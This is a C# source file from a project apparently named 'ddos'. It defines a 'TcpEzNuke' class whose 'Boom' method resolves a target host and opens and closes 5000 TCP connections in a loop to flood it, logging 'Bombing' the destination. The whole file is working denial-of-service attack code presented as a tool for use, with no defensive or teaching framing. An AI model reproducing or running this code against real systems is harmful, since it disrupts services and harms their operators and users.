using ddos.Interfaces;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ddos.Silo
{
    public class TcpEzNuke : BaseNuke
    {
        private readonly ITools _tools;
        public TcpEzNuke(ITools tools, ILogger<TcpEzNuke> logger, IServiceProvider serviceProvider, IAppArgs appArgs) : base(logger, serviceProvider, appArgs)
        {
            _tools = tools ?? throw new ArgumentNullException(nameof(tools));
        }
        public override async Task Boom(string destination, bool useProxy, CancellationToken cancellationToken)
        {
            if (string.IsNullOrWhiteSpace(destination))
                return;

            Logger.LogInformation($"TcpEz...");
            Logger.LogInformation($"Bombing {destination}");
            cancellationToken.ThrowIfCancellationRequested();
            try
            {
                var ip = await _tools.GetIP(destination) ?? throw new Exception($"IP for {destination} can not resolved.");
                Logger.LogInformation($"IP is {ip}");

                for (int p = 0; p < 5000; p++)
                {                    
                    using(var tcp = new TcpClient())
                    using (var ct = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken))
                    {
                        ct.CancelAfter(AppArgs.HttpTimeOut);
                        await tcp.ConnectAsync(ip.Address,ip.Port, ct.Token);

                        tcp.Close(); 
                    }

                    cancellationToken.ThrowIfCancellationRequested();
                }
            }
            catch (OperationCanceledException)
            {
                Logger.LogError("Time out.");
            }
            catch (Exception ex)
            {
                Logger.LogError(ex.Message, ex);
            }
        }

        public override string WhoAmI()
        {
            return "TcpEz";
        }
    }
}
